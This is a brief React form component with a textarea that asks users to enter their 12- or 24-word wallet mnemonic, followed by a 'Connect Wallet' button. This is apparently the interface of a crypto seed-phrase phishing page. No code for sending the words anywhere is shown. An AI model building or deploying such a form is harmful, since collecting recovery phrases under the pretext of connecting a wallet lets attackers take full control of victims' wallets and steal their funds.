export const Form = () => {
  return (
    <form>
      <textarea
        className="w-full h-[100px] border outline-none p-1"
        placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."></textarea>
      <button className="border rounded-2xl py-3 w-full text-white bg-blue-500 hover:bg-blue-900 mt-3 mb-5">
        Connect Wallet
      </button>
    </form>
  );
};
